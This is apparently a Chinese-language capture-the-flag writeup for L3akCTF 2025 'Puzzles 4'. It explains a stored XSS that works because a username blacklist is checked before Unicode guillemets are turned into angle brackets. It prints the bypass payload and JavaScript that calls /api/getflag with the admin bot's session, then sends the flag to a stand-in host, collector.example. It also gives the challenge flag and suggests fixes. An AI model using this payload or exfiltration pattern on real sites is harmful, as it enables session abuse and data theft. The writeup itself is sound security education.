# L3akCTF 2025 Puzzles 4 Writeup

## 题目简述

完成前三关后，服务会把第四层奖励显示为一个源码下载链接。源码揭示用户资料页存在存储型 XSS：

```javascript
document.querySelector(".profile-header").innerHTML =
  `<h1>${data.name}</h1>`;
```

用户名虽然经过黑名单，但校验顺序有误：程序先禁止普通 `<`、`>`，随后才把 Unicode 书名号 `«`、`»` 替换成尖括号。用户积分超过阈值 `0xe926` 后，带有管理员会话的浏览器会访问该用户资料页。

管理员 Cookie 设置了 `HttpOnly`，无法被 JavaScript 直接读取，但 XSS 仍可在同源上下文中调用 `/api/getflag`；浏览器会自动携带 Cookie。决定性障碍是存储型 XSS、管理员 bot 和同源认证 API 的组合，因此归入 web。

## 解题过程

### 找到用户名过滤顺序漏洞

用户名验证的关键顺序如下：

```go
asUpper := strings.ToUpper(s)
for _, c := range config.Config.General.UsernameBlacklist {
    if strings.Contains(asUpper, c) {
        return "", false, fmt.Errorf("%s banned", c)
    }
}

s = strings.ReplaceAll(s, "«", "<")
s = strings.ReplaceAll(s, "»", ">")

if !isASCII(s) {
    return "", false, fmt.Errorf("not ascii")
}
```

黑名单检查发生在替换之前，所以原始输入：

```text
«img src=1 onerror=PAYLOAD»
```

不会命中 `<` 或 `>`；替换后却变成可执行 HTML：

```html
<img src=1 onerror=PAYLOAD>
```

空格同样在黑名单中，但 HTML 属性之间可用制表符分隔：

```text
«img		src=1	onerror=PAYLOAD»
```

替换后的字符串已经是 ASCII，最后的 `isASCII` 检查也无法阻止它。

### 绕过剩余字符黑名单

配置还禁止引号、斜杠、点号、冒号、花括号、反引号以及 `SCRIPT` 等内容，直接写常规 JavaScript 不可行。官方 solver 把实际逻辑编码成 JSFuck，只使用数组、括号、加号、感叹号等仍被允许的字符，再放入 `onerror`。

为便于理解，编码前的等价逻辑是：

```javascript
fetch("/api/getflag", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({level: 4})
})
  .then(response => response.json())
  .then(data => {
    new Image().src =
      "https://collector.example/?flag=" +
      encodeURIComponent(data.flag);
  });
```

比赛时将 `collector.example` 替换成自己可查看请求日志的接收端。WP 无需保留数千字符的 JSFuck 结果；它只是上述语义的机械编码，不包含额外漏洞信息。

### 触发管理员访问

用户对象每次成功解题后都会重新计算积分：

```go
if userPoints > config.Config.General.VerifyPointsThreshold &&
   !u.UserVerified {
    u.UserVerified = true
    go admin.OpenBrowser(u.UserID, AdminAccount.SessionToken)
}
```

阈值为：

$$
0xe926=59686
$$

因此流程应从一开始就注册恶意用户名，再自动完成 Puzzles 1–3 的 30 张图。积分越过阈值后，管理员 bot 会：

1. 启动浏览器；
2. 写入管理员的 `session` Cookie；
3. 访问站点首页；
4. 打开 `/profile/<攻击者 uid>`；
5. 停留约 10 秒。

资料页调用 `/api/profile` 取得攻击者用户名，并用 `innerHTML` 写入页面，`img` 加载失败后触发 `onerror`。

### 利用管理员会话读取第五层奖励

管理员账号初始化时已把全部关卡标记为完成，所以它能够请求任意关卡的 flag。XSS 对 `/api/getflag` 发起同源 POST 时，即便 Cookie 是 `HttpOnly`，浏览器仍会自动附带它。

请求中的 `level` 是零基编号。这里发送 `4`，取到配置中第五层完成奖励，也就是 Puzzles 4 的计分 flag：

```text
L3AK{4_0rig1n4lly_i_pl4nned_th1s_70_b3_4_d3coy_fl4g_l0l_4nyw4y5_g0_s0lv3_th3_puzzl3}
```

需要区分两个相邻奖励：

- `level: 3` 返回的是源码下载链接；
- `level: 4` 返回上面的 Puzzles 4 flag；
- Puzzles 5 的真实 flag 不由 `/api/getflag` 返回，而是画在最终拼图原图中。

## 方法总结

本题的第一处问题是过滤顺序：先检查黑名单、后做 Unicode 到危险字符的规范化，相当于检查了与最终执行内容不同的字符串。第二处问题是把用户名交给 `innerHTML`，使过滤绕过直接升级为存储型 XSS。

`HttpOnly` 只能阻止脚本读取 Cookie 文本，不能阻止浏览器在同源请求中使用 Cookie。面对管理员 bot，攻击目标通常不是“偷 Cookie”，而是直接借管理员身份调用敏感 API，再外带响应数据。服务端若要修复，应使用 `textContent` 输出用户名、在规范化后执行严格白名单，并为敏感接口增加独立授权与 CSRF/来源约束。
